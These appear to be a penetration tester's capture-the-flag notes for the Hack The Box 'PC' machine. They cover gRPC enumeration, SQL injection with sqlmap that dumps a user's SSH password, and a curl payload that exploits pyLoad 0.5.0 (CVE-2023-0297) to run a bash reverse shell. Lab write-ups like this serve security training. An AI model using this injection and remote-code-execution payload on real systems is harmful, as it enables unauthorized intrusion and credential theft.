# PC

| Name      | IP           | Difficulty | OS    |
| ------ | ------------ | ---------- | ----- |
| pc | 10.10.11.214 | Easy       | Linux |

## NMAP

| HOST         | PORT | PROTO | SERVICE | VERSION                 |
| ------------ | ---- | ----- | ------- | ----------------------- |
| 10.10.11.214 | 22   | tcp   | OpenSSH | 8.2p1 Ubuntu 4ubuntu0.7 |

## HEADERS


## DIRECTORIES


## USERS

- sau HereIsYourPassWord1431

## NOTES

- port 50051 open
- http://pc.htb:50051 displays something unreadable 
- `nc pc.htb 50051` and wait
- `Did not receive HTTP/2 settings before handshake timeout`
- grpc on port 50051
- `grpcui -plaintext 10.10.11.214:50051`
- register
- id `378`
- token `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoid2l0aGVyIiwiZXhwIjoxNjg4ODQyMjMxfQ.eJ47h1fMfxYqU_0avGqHHYiGX3sZts35HYfVvlXQxLA`
- send and capture a getinfo() request in burpsuite
- save the request as `sql.req
- `sqlmap -r sql.req -p id --dump` to dump the databse and find sau's ssh password
- `localhost:8000` running `pyLoad 0.5.0` on machine found in linpeas
- create a local ssh tunnel `ssh -L 8000:127.0.0.1:8000 sau@10.10.11.214`
- https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad
- create bash reverse shell in `/tmp` and run a nc listener
- `curl -i -s -k -X $'POST' \     --data-binary $'jk=pyimport%20os;os.system(\"bash%20/tmp/shell.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \     $'http://127.0.0.1:8000/flash/addcrypted2'` will run the reverse shell
